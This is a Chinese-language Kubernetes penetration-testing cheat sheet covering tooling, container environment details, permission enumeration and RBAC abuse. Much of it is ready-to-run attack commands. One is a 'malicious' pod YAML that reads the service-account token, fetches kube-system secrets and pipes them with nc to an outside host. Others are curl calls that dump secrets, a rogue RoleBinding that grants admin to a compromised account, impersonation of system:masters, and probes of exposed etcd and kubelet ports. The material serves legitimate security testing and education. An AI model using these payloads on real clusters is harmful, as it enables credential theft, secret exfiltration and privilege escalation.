# Kubernetes

> Kubernetes是一个开源的容器编排系统，用于自动化应用程序部署、扩展和管理。它最初由谷歌设计，现在由云原生计算基金会维护。

## 摘要

- [工具](#工具)
- [容器环境](#容器环境)
- [信息收集](#信息收集)
- [RBAC配置](#rbac配置)
  - [列出机密](#列出机密)
  - [访问任何资源或动词](#访问任何资源或动词)
  - [创建Pod](#pod创建)
  - [使用Pods/Exec的权限](#使用pods/exec的权限)
  - [获取/修补Rolebindings的权限](#获取/修补rolebindings的权限)
  - [冒充特权账户](#冒充特权账户)
- [特权服务帐户令牌](#特权服务帐户令牌)
- [值得到达的有趣端点](#值得到达的有趣端点)
- [您应该知道的API地址](#您应该知道的api地址)
- [参考资料](#参考资料)

## 工具

* [kubeaudit](https://github.com/Shopify/kubeaudit) - 针对常见安全问题的Kubernetes集群审计
* [kubesec.io](https://kubesec.io/) - Kubernetes资源的安全风险分析
* [kube-bench](https://github.com/aquasecurity/kube-bench) - 通过运行[CIS Kubernetes基准测试](https://www.cisecurity.org/benchmark/kubernetes/)检查Kubernetes是否安全部署
* [kube-hunter](https://github.com/aquasecurity/kube-hunter) - 在Kubernetes集群中搜寻安全漏洞
* [katacoda](https://katacoda.com/courses/kubernetes) - 使用基于浏览器的交互式场景学习Kubernetes
* [kubescape](https://github.com/armosec/kubescape) - 自动扫描Kubernetes集群以识别安全问题

## 容器环境

Kubernetes集群内的容器自动通过其[容器环境](https://kubernetes.io/docs/concepts/containers/container-environment/)获得某些信息。通过卷、环境变量或向下API可能已经提供了额外的信息，但本节仅涵盖默认提供的内容。

### 服务帐户

每个Kubernetes pod都被分配了一个用于访问Kubernetes API的服务帐户。除了当前命名空间和Kubernetes SSL证书之外，还可以通过一个挂载的只读卷访问服务帐户：

```
/var/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/namespace
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

如果在容器中安装了`kubectl`实用程序，它将自动使用此服务帐户，并使与集群的交互变得更加容易。如果没有，可以使用`token`和`namespace`文件的内容直接发出HTTP API请求。

### 环境变量

容器自动提供`KUBERNETES_SERVICE_HOST`和`KUBERNETES_SERVICE_PORT`环境变量。它们包含Kubernetes主节点的IP地址和端口号。如果安装了`kubectl`，它将自动使用这些值。如果没有，可以使用这些值来确定发送API请求的正确IP地址。

```
KUBERNETES_SERVICE_HOST=192.168.154.228
KUBERNETES_SERVICE_PORT=443
```

此外，在创建容器时，还会为当前命名空间中运行的每个Kubernetes服务自动创建[环境变量](https://kubernetes.io/docs/concepts/services-networking/service/#discovering-services)。环境变量的命名遵循两种模式：

- 简化的`{SVCNAME}_SERVICE_HOST`和`{SVCNAME}_SERVICE_PORT`包含服务的IP地址和默认端口号。
- 每个服务公开的每个端口都有一个[Docker链接](https://docs.docker.com/network/links/#environment-variables)集合的变量，命名为`{SVCNAME}_PORT_{NUM}_{PROTOCOL}_{PROTO|PORT|ADDR}`。

例如，如果有一个名为`redis-master`的服务运行并公开了6379端口，那么以下所有环境变量都可用：

```
REDIS_MASTER_SERVICE_HOST=10.0.0.11
REDIS_MASTER_SERVICE_PORT=6379
REDIS_MASTER_PORT=tcp://10.0.0.11:6379
REDIS_MASTER_PORT_6379_TCP=tcp://10.0.0.11:6379
REDIS_MASTER_PORT_6379_TCP_PROTO=tcp
REDIS_MASTER_PORT_6379_TCP_PORT=6379
REDIS_MASTER_PORT_6379_TCP_ADDR=10.0.0.11
```

### 模拟 `kubectl` API 请求

Kubernetes 集群中的大多数容器都不会安装 `kubectl` 工具。如果无法在容器内运行[一行 `kubectl` 安装程序](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux)，您可能需要手动制定 Kubernetes HTTP API 请求。这可以通过 *本地* 使用 `kubectl` 来确定从容器发送的正确 API 请求来完成。

1. 使用 `kubectl -v9 ...` 以最大详细级别运行所需的命令。
1. 输出将包括 HTTP API 端点 URL、请求正文和一个示例 curl 命令。
1. 将端点 URL 的主机名和端口替换为容器环境变量中的 `KUBERNETES_SERVICE_HOST` 和 `KUBERNETES_SERVICE_PORT` 值。
1. 将掩码的 "Authorization: Bearer" 令牌值替换为容器中 `/var/run/secrets/kubernetes.io/serviceaccount/token` 文件的内容。
1. 如果请求有正文，请确保包含 "Content-Type: application/json" 头部，并使用惯用方法发送请求正文（对于 curl，使用 `--data` 标志）。

例如，此输出用于创建[服务帐户权限](#service-account-permissions)请求：

```powershell
# NOTE: only the Authorization and Content-Type headers are required. The rest can be omitted.
$ kubectl -v9 auth can-i --list
I1028 18:58:38.192352   76118 loader.go:359] Config loaded from file /home/example/.kube/config
I1028 18:58:38.193847   76118 request.go:942] Request Body: {"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","metadata":{"creationTimestamp":null},"spec":{"namespace":"default"},"status":{"resourceRules":null,"nonResourceRules":null,"incomplete":false}}
I1028 18:58:38.193912   76118 round_trippers.go:419] curl -k -v -XPOST  -H "Accept: application/json, */*" -H "Content-Type: application/json" -H "User-Agent: kubectl/v1.14.10 (linux/amd64) kubernetes/f5757a1" 'https://1.2.3.4:5678/apis/authorization.k8s.io/v1/selfsubjectrulesreviews'
I1028 18:58:38.295722   76118 round_trippers.go:438] POST https://1.2.3.4:5678/apis/authorization.k8s.io/v1/selfsubjectrulesreviews 201 Created in 101 milliseconds
I1028 18:58:38.295760   76118 round_trippers.go:444] Response Headers:
...
```

## 信息收集

### 服务帐户权限

默认服务帐户可能已被授予额外的权限，这些权限使得集群被攻击或横向移动更加容易。
以下方法可用于确定服务帐户的权限：

```powershell
# Namespace-level permissions using kubectl
kubectl auth can-i --list

# Cluster-level permissions using kubectl
kubectl auth can-i --list --namespace=kube-system

# Permissions list using curl
NAMESPACE=$(cat "/var/run/secrets/kubernetes.io/serviceaccount/namespace")
# For cluster-level, use NAMESPACE="kube-system" instead

MASTER_URL="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
TOKEN=$(cat "/var/run/secrets/kubernetes.io/serviceaccount/token")
curl "${MASTER_URL}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  --cacert "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt" \
  --header "Authorization: Bearer ${TOKEN}" \
  --header "Content-Type: application/json" \
  --data '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"'${NAMESPACE}'"}}'
```

### Secrets, ConfigMaps, and Volumes

Kubernetes 提供了 Secrets 和 ConfigMaps 作为在运行时将配置加载到容器中的方法。虽然它们可能不会直接导致整个集群的泄露，但它们包含的信息可能导致单个服务的泄露或在集群内进行横向移动。

从容器的角度来看，Kubernetes Secrets 和 ConfigMaps 是相同的。两者都可以加载到环境变量中或作为卷挂载。无法判断环境变量是从 Secret/ConfigMap 加载的，因此需要手动检查每个环境变量。当作为卷挂载时，Secrets/ConfigMaps 总是作为只读 tmpfs 文件系统挂载。您可以使用 `grep -F "tmpfs ro" /etc/mtab` 快速找到这些。

真正的 Kubernetes 卷通常用作共享存储或在重启之间进行持久化存储。这些通常作为 ext4 文件系统挂载，可以使用 `grep -wF "ext4" /etc/mtab` 进行识别。


### 特权容器

Kubernetes 支持广泛的 [安全上下文](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)，用于容器和 Pod 的执行。其中最重要的安全策略是“特权”[安全策略](https://kubernetes.io/docs/concepts/policy/pod-security-policy/)，它使主机节点的设备在容器的 `/dev` 目录下可用。这意味着可以访问主机的 Docker 套接字文件（允许任意容器操作），以及主机的根磁盘（可以用来完全逃离容器）。

虽然没有官方的方法从*容器内部*检查特权模式，但检查 `/dev/kmsg` 是否存在通常就足够了。

## RBAC 配置

### 列出机密

获得列出集群中机密的攻击者可以使用以下 curl 命令获取 "kube-system" 命名空间中的所有机密。

```powershell
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```

### 访问任何资源或动词

```powershell
resources:
- '*'
verbs:
- '*'
```

### 创建 Pod

使用 `kubectl get role system:controller:bootstrap-signer -n kube-system -o yaml` 检查您的权限。
然后创建一个恶意的 pod.yaml 文件。

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: alpine
  namespace: kube-system
spec:
  containers:
  - name: alpine
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
  serviceAccountName: bootstrap-signer
  automountServiceAccountToken: true
  hostNetwork: true
```

然后 `kubectl apply -f malicious-pod.yaml`

### 使用 Pods/Exec 的权限

```powershell
kubectl exec -it <POD NAME> -n <PODS NAMESPACE> –- sh
```

### 获取/修补 Rolebindings 的权限

此 JSON 文件的目的是将管理员 "ClusterRole" 绑定到受损的服务帐户。
创建一个恶意的 RoleBinging.json 文件。

```powershell
{
    "apiVersion": "rbac.authorization.k8s.io/v1",
    "kind": "RoleBinding",
    "metadata": {
        "name": "malicious-rolebinding",
        "namespcaes": "default"
    },
    "roleRef": {
        "apiGroup": "*",
        "kind": "ClusterRole",
        "name": "admin"
    },
    "subjects": [
        {
            "kind": "ServiceAccount",
            "name": "sa-comp"
            "namespace": "default"
        }
    ]
}
```

```powershell
curl -k -v -X POST -H "Authorization: Bearer <JWT TOKEN>" -H "Content-Type: application/json" https://<master_ip>:<port>/apis/rbac.authorization.k8s.io/v1/namespaces/default/rolebindings -d @malicious-RoleBinging.json
curl -k -v -X POST -H "Authorization: Bearer <COMPROMISED JWT TOKEN>" -H "Content-Type: application/json" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secret
```

[Kubernetes Pod 权限提升](https://labs.bishopfox.com/tech-blog/bad-pods-kubernetes-pod-privilege-escalation)

### 伪装特权账户

```powershell
curl -k -v -XGET -H "Authorization: Bearer <JWT 令牌（伪装者）>" -H "Impersonate-Group: system:masters" -H "Impersonate-User: null" -H "Accept: application/json" https://<主节点IP>:<端口>/api/v1/namespaces/kube-system/secrets/
```

## 特权服务账户令牌

```powershell
$ cat /run/secrets/kubernetes.io/serviceaccount/token
$ curl -k -v -H "Authorization: Bearer <jwt_token>" https://<主节点IP>:<端口>/api/v1/namespaces/default/secrets/
```

## 可以访问的有趣端点

```powershell
# 列出Pods
curl -v -H "Authorization: Bearer <jwt_token>" https://<主节点IP>:<端口>/api/v1/namespaces/default/pods/

# 列出secrets
curl -v -H "Authorization: Bearer <jwt_token>" https://<主节点IP>:<端口>/api/v1/namespaces/default/secrets/

# 列出deployments
curl -v -H "Authorization: Bearer <jwt_token>" https://<主节点IP>:<端口>/apis/extensions/v1beta1/namespaces/default/deployments

# 列出daemonsets
curl -v -H "Authorization: Bearer <jwt_token>" https://<主节点IP>:<端口>/apis/extensions/v1beta1/namespaces/default/daemonsets
```

## 你应该知道的API地址

*(外部网络可见性)*

### cAdvisor

```powershell
curl -k https://<IP地址>:4194
```

### 不安全的API服务器

```powershell
curl -k https://<IP地址>:8080
```

### 安全的API服务器

```powershell
curl -k https://<IP地址>:(8|6)443/swaggerapi
curl -k https://<IP地址>:(8|6)443/healthz
curl -k https://<IP地址>:(8|6)443/api/v1
```

### etcd API

```powershell
curl -k https://<IP地址>:2379
curl -k https://<IP地址>:2379/version
etcdctl --endpoints=http://<主节点IP>:2379 get / --prefix --keys-only
```

### Kubelet API

```powershell
curl -k https://<IP地址>:10250
curl -k https://<IP地址>:10250/metrics
curl -k https://<IP地址>:10250/pods
```

### kubelet（只读）

```powershell
curl -k https://<IP地址>:10255
http://<外部IP>:10255/pods
```

## 参考资料

- [Kubernetes渗透测试方法论第一部分 - 作者Or Ida于2019年8月8日发表](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
- [Kubernetes渗透测试方法论第二部分 - 作者Or Ida于2019年9月5日发表](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-2)
- [Kubernetes渗透测试方法论第三部分 - 作者Or Ida于2019年11月21日发表](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3)
- [在BSidesSF CTF中捕获所有旗帜通过控制我们的基础设施 - Hackernoon](https://hackernoon.com/capturing-all-the-flags-in-bsidessf-ctf-by-pwning-our-infrastructure-3570b99b4dd0)
